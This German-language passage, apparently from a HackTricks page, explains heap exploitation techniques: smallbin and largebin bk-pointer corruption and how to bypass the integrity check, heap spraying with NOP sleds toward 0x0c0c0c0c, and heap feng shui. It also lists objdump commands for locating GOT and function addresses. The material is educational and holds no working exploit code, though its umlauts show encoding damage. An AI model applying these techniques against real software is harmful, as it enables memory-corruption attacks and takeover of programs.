Die freigegebenen St√ºcke werden in den Bin basierend auf ihrer Gr√∂√üe eingef√ºgt. Aber bevor sie eingef√ºgt werden, werden sie in unsorted bins gespeichert. Ein St√ºck wird freigegeben, wird nicht sofort in seinen Bin eingef√ºgt, sondern bleibt in unsorted bins. Wenn dann ein neues St√ºck reserviert wird und das vorherige freigegebene ihm dienen kann, wird es zur√ºckgegeben, aber wenn ein gr√∂√üeres reserviert wird, wird das in unsorted bins freigegebene St√ºck in seinen entsprechenden Bin eingef√ºgt.

Um den anf√§lligen Code zu erreichen, muss die Speicheranforderung gr√∂√üer als av->max\_fast (normalerweise 72) und kleiner als MIN\_LARGE\_SIZE (512) sein.

Wenn im Bin ein St√ºck der geeigneten Gr√∂√üe f√ºr das, was angefordert wird, vorhanden ist, wird dieses nach dem Entkoppeln zur√ºckgegeben:

bck = victim->bk; Zeigt auf das vorherige St√ºck, es ist die einzige Info, die wir √§ndern k√∂nnen.

bin->bk = bck; Das vorletzte St√ºck wird das letzte, falls bck auf den Stack zeigt, wird die n√§chste reservierte St√ºck diese Adresse erhalten.

bck->fd = bin; Die Liste wird geschlossen, indem dieses auf den Bin zeigt.

Es wird ben√∂tigt:

Dass zwei malloc reserviert werden, sodass der erste √ºberlaufen werden kann, nachdem der zweite freigegeben und in seinen Bin eingef√ºgt wurde (d.h. ein gr√∂√üerer malloc reserviert wurde als das zweite St√ºck, bevor der √úberlauf erfolgt).

Dass der malloc, dem die vom Angreifer gew√§hlte Adresse zugewiesen wird, vom Angreifer kontrolliert wird.

Das Ziel ist folgendes: Wenn wir einen √úberlauf auf einen Heap machen k√∂nnen, der unter einem bereits freigegebenen St√ºck und in seinem Bin liegt, k√∂nnen wir seinen bk-Zeiger √§ndern. Wenn wir seinen bk-Zeiger √§ndern und dieses St√ºck das erste in der Bin-Liste wird und reserviert wird, wird der Bin get√§uscht und ihm gesagt, dass das letzte St√ºck der Liste (das n√§chste, das angeboten wird) an die falsche Adresse zeigt, die wir gesetzt haben (zum Beispiel auf den Stack oder GOT). Wenn dann ein weiteres St√ºck reserviert wird und der Angreifer Berechtigungen daf√ºr hat, wird ihm ein St√ºck an der gew√ºnschten Position zugewiesen und er kann dort schreiben.

Nachdem das modifizierte St√ºck freigegeben wurde, ist es notwendig, ein St√ºck gr√∂√üer als das freigegebene zu reservieren, sodass das modifizierte St√ºck aus den unsorted bins herauskommt und in seinen Bin eingef√ºgt wird.

Sobald es in seinem Bin ist, ist es an der Zeit, seinen bk-Zeiger durch den √úberlauf zu √§ndern, sodass er auf die Adresse zeigt, die wir √ºberschreiben m√∂chten.

So muss der Bin warten, bis malloc() oft genug aufgerufen wird, damit der modifizierte Bin erneut verwendet wird und den Bin t√§uscht, indem er ihm glauben macht, dass das n√§chste St√ºck an der falschen Adresse ist. Und dann wird das St√ºck, das uns interessiert, bereitgestellt.

Um die Verwundbarkeit so schnell wie m√∂glich auszuf√ºhren, w√§re es ideal: Reservierung des anf√§lligen St√ºcks, Reservierung des St√ºcks, das modifiziert werden soll, Freigabe dieses St√ºcks, Reservierung eines gr√∂√üeren St√ºcks, das modifiziert werden soll, Modifikation des St√ºcks (Verwundbarkeit), Reservierung eines St√ºcks der gleichen Gr√∂√üe wie das verwundete und Reservierung eines zweiten St√ºcks der gleichen Gr√∂√üe, und dieses wird auf die gew√§hlte Adresse zeigen.

Um diesen Angriff zu sch√ºtzen, wurde die typische √úberpr√ºfung verwendet, dass das St√ºck ‚Äúnicht‚Äù gef√§lscht ist: Es wird √ºberpr√ºft, ob bck->fd auf victim zeigt. Das hei√üt, in unserem Fall, ob der Zeiger fd\* des gef√§lschten St√ºcks, das im Stack gezeigt wird, auf victim zeigt. Um diesen Schutz zu umgehen, m√ºsste der Angreifer in der Lage sein, auf irgendeine Weise (wahrscheinlich √ºber den Stack) an die richtige Adresse die Adresse von victim zu schreiben. Damit es wie ein echtes St√ºck aussieht.

**LargeBin-Korruption**

Die gleichen Anforderungen wie zuvor sind erforderlich, plus einige mehr, au√üerdem m√ºssen die reservierten St√ºcke gr√∂√üer als 512 sein.

Der Angriff ist wie der vorherige, das hei√üt, der bk-Zeiger muss ge√§ndert werden und es sind all diese Aufrufe zu malloc() erforderlich, aber au√üerdem muss die Gr√∂√üe des modifizierten St√ºcks so ge√§ndert werden, dass diese Gr√∂√üe - nb < MINSIZE ist.

Zum Beispiel wird es bewirken, dass die Gr√∂√üe auf 1552 gesetzt wird, damit 1552 - 1544 = 8 < MINSIZE (die Subtraktion darf nicht negativ sein, da ein unsigned verglichen wird).

Au√üerdem wurde ein Patch eingef√ºhrt, um es noch komplizierter zu machen.

**Heap-Spraying**

Es besteht im Wesentlichen darin, so viel Speicher wie m√∂glich f√ºr Heaps zu reservieren und diese mit einer Matratze aus nops zu f√ºllen, die mit einem Shellcode endet. Au√üerdem wird als Matratze 0x0c verwendet. Es wird versucht, zur Adresse 0x0c0c0c0c zu springen, und wenn eine Adresse √ºberschrieben wird, die aufgerufen werden soll, wird dorthin gesprungen. Grunds√§tzlich ist die Taktik, so viel wie m√∂glich zu reservieren, um zu sehen, ob ein Zeiger √ºberschrieben wird und zu 0x0c0c0c0c zu springen, in der Hoffnung, dass dort nops sind.

**Heap Feng Shui**

Es besteht darin, durch Reservierungen und Freigaben den Speicher so zu s√§en, dass reservierte St√ºcke zwischen freien St√ºcke liegen. Der Buffer, der √ºberlaufen werden soll, wird in einem der Eier platziert.

**objdump -d ausf√ºhrbare Datei** ‚Äî> Disassembliere Funktionen\
**objdump -d ./PROGRAMA | grep FUNKTION** ‚Äî> Hole die Funktionsadresse\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Um zu sehen, dass es tats√§chlich unser Shellcode ist und die OpCodes zu extrahieren\
**objdump -t ./exec | grep varBss** ‚Äî> Symboltabelle, um Adressen von Variablen und Funktionen zu extrahieren\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Um Adressen von Bibliotheksfunktionen (GOT) zu extrahieren\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Extrahiert die Adresse von puts, die in der GOT √ºberschrieben werden soll\
**objdump -D ./exec** ‚Äî> Disassembliere ALLE bis zu den Eintr√§gen der plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info zur Funktion in gdb

## Interessante Kurse

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referenzen**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichen.

</details>
{% endhint %}
